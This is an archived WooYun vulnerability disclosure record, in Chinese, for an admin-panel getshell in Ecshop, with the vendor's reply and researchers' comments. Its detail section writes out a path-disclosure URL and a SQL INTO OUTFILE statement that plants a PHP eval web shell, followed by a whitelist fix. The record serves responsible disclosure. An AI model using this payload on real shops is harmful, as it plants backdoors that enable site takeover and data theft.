{"id": 11522, "wybug_id": "wooyun-2013-024727", "wybug_title": "Ecshop后台getshell漏洞", "wybug_corp": "ShopEx", "wybug_author": "VIP", "wybug_date": "2013-05-29 14:39", "wybug_open_date": "2013-07-13 14:40", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-13：\t细节向公众公开  简要描述： 非模板 详细说明：  爆路径+sql命令执行=getshell0x01.爆路径，得到物理路径\nhttp://127.0.0.1/ecshop/languages/en_us/common.php\n\n\n0x02.后台sql语句执行处，into outfile写文件，配合上步得到的物理路径拿shell在sql语句处输入：\nselect \"<?php @eval($_POST['c']);?>\" into outfile '物理路径//test.php';\n\n\n0x03.提交执行，接下来，mysql报错了\n\n0x04.再去看看，可爱的shell已经在那里了\n\n   漏洞证明：  \n\n   修复方案：  最好不要提供Sql语句执行功能，如果要的话，也尽量像Discuz!一样，设置一个白名单，只允许执行白名单内的无害语句。   版权声明：转载请注明来源 VIP@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2013-05-29 20:23 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-29 14:51 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:89        | 一名普通的phper开发者，关注web安全。)\t\t \n  非任意文件包含吗？？    \n     2013-05-29 14:52 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  唉 条件太苛刻 估计木钱    \n     2013-05-29 15:15 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:89        | 一名普通的phper开发者，关注web安全。)\t\t \n  @xsser 后台注入有钱不？    \n     2013-05-29 15:54 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  @xsser 有wb也不错    \n     2013-05-29 16:01 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  @齐迹 估计木有    \n     2013-06-29 09:09 |    \t\tkimdle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | @kimdle)\t\t \n  条件不好满足啊    \n     2013-06-29 09:53 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  爆路径是两点，不然也写不了shell    \n     2013-06-29 13:36 |    \t\t老黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:161 漏洞数:49        | 最爱红颜不老。)\t\t \n  汗。后台GETSHEL的一大堆。这样也有WB    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}